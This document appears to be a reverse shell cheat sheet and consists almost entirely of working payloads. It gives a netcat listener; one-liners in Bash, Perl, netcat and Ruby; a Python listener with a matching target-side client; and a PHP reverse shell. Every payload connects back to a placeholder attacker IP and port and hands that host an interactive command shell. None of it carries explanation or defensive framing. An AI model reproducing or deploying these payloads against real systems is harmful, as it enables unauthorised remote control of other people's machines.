Attacker Side
nc -lvp <port>


Attacker
Bash
bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1

PERL
perl -e 'use Socket;$i="YOUR_IP";$p=YOUR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

PYTHON
Listener Script (Attacker's Machine)
import socket

def start_listener():
    host = 'YOUR_IP_ADDRESS'  # Replace with your IP address
    port = YOUR_PORT_NUMBER  # Replace with your desired port number

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((host, port))
    listener.listen(1)
    print("[+] Waiting for incoming connection...")
    connection, address = listener.accept()
    print("[+] Connection from:", address)

    while True:
        command = input("Enter command to execute (or type 'exit' to quit): ")
        if command.lower() == 'exit':
            connection.send(b'exit')
            connection.close()
            break
        else:
            connection.send(command.encode())
            output = connection.recv(4096).decode()
            print(output)

if __name__ == "__main__":
    start_listener()


Client Script (Target Machine):
import socket
import subprocess

def connect():
    host = 'ATTACKER_IP_ADDRESS'  # Replace with the attacker's IP address
    port = ATTACKER_PORT_NUMBER  # Replace with the port number the attacker is listening on

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    while True:
        command = client.recv(4096).decode()
        if command.lower() == 'exit':
            break
        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                client.send(output)
            except Exception as e:
                client.send(str(e).encode())

    client.close()

if __name__ == "__main__":
    connect()


NETCAT
nc ATTACKER_IP PORT -e /bin/bash

RUBY
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("YOUR_ATTACKER_IP","YOUR_PORT");loop{c.gets.chomp!;exit if $_=="exit";IO.popen($_,[:err,:out]=>[:child,:out,:err]){c.puts"\#{$stdout.read}\#{$stderr.read}"}rescue c.puts"Command failed"}'


PHP
<?php
$ip = 'YOUR_ATTACKER_IP'; // Replace 'YOUR_ATTACKER_IP' with your attacker machine's IP address
$port = 1234;              // Replace 1234 with the port you're listening on

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    die("Error: $errno - $errstr\n");
}

while (true) {
    $command = trim(fgets($sock));
    if ($command == "quit") {
        break;
    }
    $output = shell_exec("$command 2>&1");
    fwrite($sock, $output);
}

fclose($sock);
?>


